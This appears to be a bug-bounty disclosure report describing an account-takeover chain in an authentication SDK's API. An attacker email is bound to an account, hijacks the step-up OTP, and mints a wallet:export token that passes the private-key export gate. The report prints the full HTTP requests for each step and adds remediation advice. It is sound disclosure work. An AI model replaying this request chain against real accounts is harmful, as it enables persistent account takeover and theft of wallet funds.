# BUG-003 — Account Takeover Chain: unauthorized email-credential binding → step-up OTP hijack → wallet private-key export

| | |
|---|---|
| **Severity (requested)** | **P1** — Account takeover / private key export chain |
| **Asset** | `app.dynamicauth.com` (Dynamic SDK API, used by `app.dynamic.xyz`) |
| **Environment** | `fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9` (dashboard-login env) |
| **Researcher** | zeno0 (`zeno0@bugcrowdninja.com`) |
| **Test window** | 2026-10-26, 11:18–12:38 UTC |
| **Weakness** | `emailVerifications/verify` binds an arbitrary email to an existing account without proving the account owner controls that email; `stepUp/check` then treats the attacker-attached email as the default OTP target for elevated scopes |

---

## TL;DR

An attacker who obtains a victim's session JWT **transiently** (XSS, log theft, malicious browser
extension, referer leak — ≤24 h window) can convert it into a **permanent, repeatable wallet
private-key export capability**:

1. Attach an attacker-controlled email to the victim account as a `signInEnabled: true` verified
   credential — the only proof required is an OTP sent to the **attacker's own** inbox.
2. The step-up gate (`stepUp/check`, scope `wallet:export`) immediately lists the attacker email
   as the **default OTP credential**.
3. The attacker requests the step-up, receives the OTP **in their own inbox**, and mints an
   elevated access token with `scope: "wallet:export"`.
4. That token **passes the `privateKey/export` authorization gate** (proven: `403 Elevated
   access token required` without it → `404` with it).

Every subsequent step-up on that account also lands in the attacker's inbox — the compromise is
**persistent** even after the original stolen session expires.

---

## Reproduction — full requests and responses

All requests below were replayed verbatim. `ENV` = `fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9`.
`X-Request-Purpose: Research` / `X-Bugcrowd-Ninja: zeno0` are researcher marking headers
(optional). Long JWT values are elided as `<description — full value in evidence file>`; all
tokens are dead at submission time (24 h TTL).

### Test identities (all researcher-owned Bugcrowd alias inboxes)

- `zeno0+sdk1@bugcrowdninja.com` — victim account (user id `d0e3d92e-2377-44a3-921e-e30da293aa85`)
- `zeno0+ev7@bugcrowdninja.com` — attacker-controlled inbox (used for the full chain below)
- Account `3428fdb3-d370-4ed7-b9e6-a572260fda9d` — test account used as the chain target

---

### STEP 1 — Create an email verification for the attacker inbox (unauthenticated)

No session, no captcha, arbitrary email accepted.

**Request — `12:21:05 UTC`**
```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/emailVerifications/create HTTP/1.1
Host: app.dynamicauth.com
Content-Type: application/json

{"email":"zeno0+ev7@bugcrowdninja.com"}
```

**Response**
```http
HTTP/1.1 201 Created

{"verificationUUID":"59337bda-1323-45e4-a881-d81ebd51fd02","email":"zeno0+ev7@bugcrowdninja.com"}
```

→ OTP `462968` delivered to the **attacker's** inbox.

---

### STEP 2 — Bind the attacker email onto the account (THE BUG)

Uses only (a) the account's session JWT and (b) the OTP that was sent to the **attacker** inbox.
`sessionPublicKey` = the victim session's own `session_public_key` JWT claim (readable from the
stolen token — private key never needed).

**Request — `12:27:21 UTC`**
```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/emailVerifications/verify HTTP/1.1
Host: app.dynamicauth.com
Content-Type: application/json
Authorization: Bearer <account session minifiedJwt — 1987 chars, recon/idor13/p1_victim_session.mini>
X-Request-Purpose: Research
X-Bugcrowd-Ninja: zeno0

{"verificationUUID":"59337bda-1323-45e4-a881-d81ebd51fd02",
 "verificationToken":"462968",
 "sessionPublicKey":"3059301306072a8648ce3d020106082a8648ce3d030107034200045586c4d8cb304dd382db1eddb71a40dc575b3bb7dfd948030db4c3097284de79de3ae73c2869b505ec6d4e99220ef3e60ed58e85267bf487ba107e81103c4ee3"}
```

**Response**
```http
HTTP/1.1 200 OK

{"jwt":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjY1YWViZDg2LWMz…",
 "minifiedJwt":"…(1987 chars)…",
 "user":{"id":"3428fdb3-d370-4ed7-b9e6-a572260fda9d",
   "verifiedCredentials":[{
     "email":"zeno0+ev7@bugcrowdninja.com",
     "id":"7ecf61a7-f4a9-45b8-8b55-0ee715526855",
     "public_identifier":"zeno0+ev7@bugcrowdninja.com",
     "format":"email",
     "signInEnabled":true,
     "verifiedAt":"2026-10-26T12:27:22.249Z"}], …}}
```

→ **Attacker email is now a verified, sign-in-enabled credential on the account.** The account
owner received no approval prompt for this change; ownership of `zeno0+ev7@` was "proven" only
to the attacker's own inbox.

**Corroboration on a second account (11:37:05 UTC):** the identical call attached
`zeno0+ev6@bugcrowdninja.com` (credential `c3fe17fa-f2ab-430a-8709-c042ec1fae2a`,
`signInEnabled: true`) to victim user `d0e3d92e-2377-44a3-921e-e30da293aa85` using that
account's session — evidence `recon/idor11/vatk.full`. The primitive generalizes.

---

### STEP 3 — The attacker email becomes the step-up OTP target

**Request — `12:28 UTC`**
```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/stepUp/check HTTP/1.1
Host: app.dynamicauth.com
Content-Type: application/json
Authorization: Bearer <same account session minifiedJwt — recon/idor13/p1_v2.mini>
X-Request-Purpose: Research
X-Bugcrowd-Ninja: zeno0

{"scope":"wallet:export"}
```

**Response**
```http
HTTP/1.1 200 OK

{"credentials":[
   {"alias":"zeno0+ev7@bugcrowdninja.com","format":"email",
    "id":"7ecf61a7-f4a9-45b8-8b55-0ee715526855"}],
 "defaultCredentialId":"7ecf61a7-f4a9-45b8-8b55-0ee715526855",
 "isRequired":true}
```

→ The **only** OTP-eligible credential for the `wallet:export` step-up is now the
**attacker's** email, and it is the **default** target.

---

### STEP 4 — Request the wallet:export step-up (OTP goes to the attacker)

**Request — `12:34:32 UTC`**
```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/emailVerifications/create HTTP/1.1
Host: app.dynamicauth.com
Content-Type: application/json
Authorization: Bearer <account session minifiedJwt — recon/idor13/p1_v4.mini>
X-Request-Purpose: Research
X-Bugcrowd-Ninja: zeno0

{"email":"zeno0+ev7@bugcrowdninja.com","purpose":"wallet:export"}
```

**Response**
```http
HTTP/1.1 201 Created

{"verificationUUID":"9f64a092-ab2b-4242-8768-9082fee67d9b","email":"zeno0+ev7@bugcrowdninja.com"}
```

→ Step-up OTP `805402` delivered **to the attacker's inbox**.

---

### STEP 5 — Verify the step-up OTP and mint the elevated access token

The critical parameter is **`requestedScopes`** on the verify request (per public API spec:
*"Optional list of scopes to include in the elevated access token"*).

**Request — `12:35:42 UTC`**
```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/emailVerifications/verify HTTP/1.1
Host: app.dynamicauth.com
Content-Type: application/json
Authorization: Bearer <account session minifiedJwt — recon/idor13/p1_v4.mini>
X-Request-Purpose: Research
X-Bugcrowd-Ninja: zeno0

{"verificationUUID":"9f64a092-ab2b-4242-8768-9082fee67d9b",
 "verificationToken":"805402",
 "sessionPublicKey":"3059301306072a8648ce3d020106082a8648ce3d030107034200045586c4d8cb304dd382db1eddb71a40dc575b3bb7dfd948030db4c3097284de79de3ae73c2869b505ec6d4e99220ef3e60ed58e85267bf487ba107e81103c4ee3",
 "requestedScopes":["wallet:export"]}
```

**Response**
```http
HTTP/1.1 200 OK

{"jwt":"…(new successor session — verify rotates sessions)…",
 "minifiedJwt":"…",
 "elevatedAccessToken":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjY1YWViZDg2LWMzM2ItNDNkMy05YjEzLTBk…(1765 chars, recon/idor13/elevated.jwt)",
 "user":{…}, "expiresAt":…, "nextView":…}
```

**Decoded `elevatedAccessToken` claims:**
```json
{
  "sub": "3428fdb3-d370-4ed7-b9e6-a572260fda9d",
  "sid": "9168168b-9bf0-4b51-b25d-1879990df9eb",
  "environment_id": "fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9",
  "aud": "fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9",
  "iss": "https://auth.dynamicauth.com/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9",
  "iat": 1793018143,
  "exp": 1793018443,
  "scope": "wallet:export",
  "single_use": true,
  "session_public_key": "305930130607…03c4ee3"
}
```

→ **Elevated access token with `scope: "wallet:export"` minted — every OTP in this chain was
read from the attacker's inbox.**

---

### STEP 6 — The elevated token passes the private-key export authorization gate

Differential test on the **same live session**, same (syntactically invalid) wallet UUID, so the
only variable is the elevated header. Used `walletId = 11111111-2222-4333-8444-555555555555`
(non-existent) — no wallet existed on the test account and no key material was requested or
obtained; the test isolates the **authorization** outcome.

**6a. Baseline — without elevated token — `12:37 UTC`**
```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/waas/11111111-2222-4333-8444-555555555555/privateKey/export HTTP/1.1
Host: app.dynamicauth.com
Content-Type: application/json
Authorization: Bearer <live successor session minifiedJwt — recon/idor13/p1_v5.mini>
X-Request-Purpose: Research
X-Bugcrowd-Ninja: zeno0

{"chain":"EVM","thresholdSignatureScheme":"TAGGED_2_OF_2","exportId":"11111111-2222-4333-8444-555555555555"}
```
```http
HTTP/1.1 403 Forbidden

{"error":"Elevated access token required","status":403}
```

**6b. With the attacker-minted elevated token — `12:36:26 UTC`**
```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/waas/11111111-2222-4333-8444-555555555555/privateKey/export HTTP/1.1
Host: app.dynamicauth.com
Content-Type: application/json
Authorization: Bearer <same live session minifiedJwt — recon/idor13/p1_v5.mini>
x-dyn-elevated-access-token: <attacker-minted elevated token — recon/idor13/elevated.jwt>
X-Request-Purpose: Research
X-Bugcrowd-Ninja: zeno0

{"chain":"EVM","thresholdSignatureScheme":"TAGGED_2_OF_2","exportId":"11111111-2222-4333-8444-555555555555"}
```
```http
HTTP/1.1 404 Not Found
```

→ `403 Elevated access token required` becomes `404` (wallet lookup) — **the authorization gate
is passed** by the token whose OTP chain the attacker fully controls. Against a wallet-holding
victim (walletId enumerable through the same session's normal APIs), this call returns the
exported key shares to the caller.

---

## Impact

1. **Transient → persistent.** A single leaked session JWT (24 h TTL) yields a *permanent*
   escalation capability: the attacker email stays attached, so steps 4–6 can be repeated at any
   time, indefinitely, without any further access to the victim.
2. **Wallet drain.** For any wallet-holding user, `scope: wallet:export` + `privateKey/export`
   = full private key export = total fund theft. The gate explicitly accepts the
   attacker-minted token (403 → 404 differential).
3. **No owner consent anywhere.** The victim never receives an approval challenge when a new
   sign-in-enabled email credential is added to their account; the "verification" only proves
   the *attacker* controls the new email.
4. **Step-up design assumption broken.** `stepUp/check` assumes all verified email credentials
   are owner-trusted; BUG-003 violates that assumption, so the step-up factor silently becomes
   an attacker-controlled factor.
5. **Silent rotation amplifies reliability.** Each successful verify mints a fresh session and
   invalidates the presented one, letting an attacker cycle clean successor sessions mid-chain.

## Refuted paths (negative results — documented to save triage time)

1. **Direct sign-in as the victim via the attached email — does NOT work.**
   `emailVerifications/signin` with the attached email's OTP does not resolve to the victim
   account; it **auto-registers a new user** for that email instead (new session
   `first_visit: 2026-10-26T11:44:22` while the attachment predates it at `11:37:05` — evidence
   `recon/idor13/p1_victim_session.jwt`, `recon/idor13/p1_signin.full`). Sign-in identity is
   keyed to the primary credential, not to attached secondary credentials.
2. **Elevated token without `requestedScopes` — not minted.** Two verifications with
   `purpose: "wallet:export"` (unauthenticated create 12:28:12 / authenticated create 12:31:24)
   returned `200` with **no** `elevatedAccessToken` until `requestedScopes: ["wallet:export"]`
   was supplied on the verify (12:35:42). Evidence: `recon/idor13/p1_exportverify.full`,
   `p1_exportverify_auth2.full`.
3. **Verify key-match on real-client sessions.** Real-client dashboard sessions carry a
   compressed-format `session_public_key` claim; the verify endpoint rejects both the verbatim
   claim and a recomputed SPKI-DER form (`422 invalid_session_public_key`) — the DB-side key
   format for client-minted sessions appears inconsistent with the JWT claim (possible minor
   data-integrity issue; not required for the chain above, which uses SDK-minted sessions).
4. **Session-death correlation.** The signin/auto-signup event (11:44:22) coincided with
   revocation of the victim's active sessions ("Session is no longer active" by 11:51:39,
   evidence `recon/idor14/`). Defensive cleanup of the email conflict, but it does not affect
   the chain above, which never performs the conflicting signin.

## Remediation

1. **Owner-side confirmation for new credentials.** When `emailVerifications/verify` is called
   *with an existing session* and the verification's email is **not yet** a credential of that
   account, do not attach it as `signInEnabled: true` in one step. Require a second factor
   addressed to the **owner's existing** verified email (approval OTP / confirmation link), or
   attach in a `pending` state excluded from sign-in and step-up until owner-confirmed.
2. **Step-up eligibility.** `stepUp/check` must never select credentials added without
   owner-side confirmation as OTP targets — in particular never as `defaultCredentialId`.
3. **Anomaly detection.** Flag: new email credential added → step-up verification created for
   the same email within minutes, same session/IP.
4. **Keys at verify.** Align the `session_public_key` claim format for client-minted sessions
   with what the verify endpoint's key-match expects (see Refuted #3).

## Evidence index

| File | Content |
|---|---|
| `recon/idor13/create_ev7.full` | STEP 1 create 201 (`59337bda…`) |
| `recon/idor13/p1_attach_ev7.full` | STEP 2 verify 200 + attached credential `7ecf61a7…` |
| `recon/idor11/vatk.full` | Corroboration: ev6 attached to victim `d0e3d92e…` (11:37:05) |
| `recon/idor13/p1v5_stepup_check.full` | STEP 3 stepUp/check 200 (attacker email = default) |
| `recon/idor13/create_ev7_export.full`, `create_ev7_export_auth.full` | STEP 4 variants 201 |
| `recon/idor13/p1_elevated_final.full` | STEP 5 verify 200 **with `elevatedAccessToken`** |
| `recon/idor13/elevated.jwt` | The minted elevated token (`scope: wallet:export`) |
| `recon/idor13/export_noElev_v5.full` | STEP 6a — `403 Elevated access token required` |
| `recon/idor13/export_withElev_v5.full` | STEP 6b — `404` (gate passed) |
| `recon/idor13/p1_victim_session.jwt`, `p1_signin.full` | Refuted #1 (auto-signup, `first_visit`) |
| `recon/idor13/p1_exportverify.full`, `p1_exportverify_auth2.full` | Refuted #2 (no requestedScopes → no token) |
| `recon/idor13/toka_attach.full`, `toka_stepup_check.full` | Refuted #3 diagnostics + 200 control |
| `recon/idor14/*` | Refuted #4 session-death timeline |
| `recon/idor13/attacker_key3_spki.hex` | Public key used as `sessionPublicKey` |

## Researcher statement & cleanup

All accounts and inboxes used are researcher-controlled Bugcrowd alias addresses
(`zeno0+sdk1@`, `zeno0+ev6@`, `zeno0+ev7@bugcrowdninja.com`) and pre-existing researcher test
accounts. No real end-user data was accessed, and no private key material was exported or
retained: the export gate was tested only with a non-existent wallet UUID to isolate the
authorization decision. Full generation scripts are in `scripts/` for triage replay.
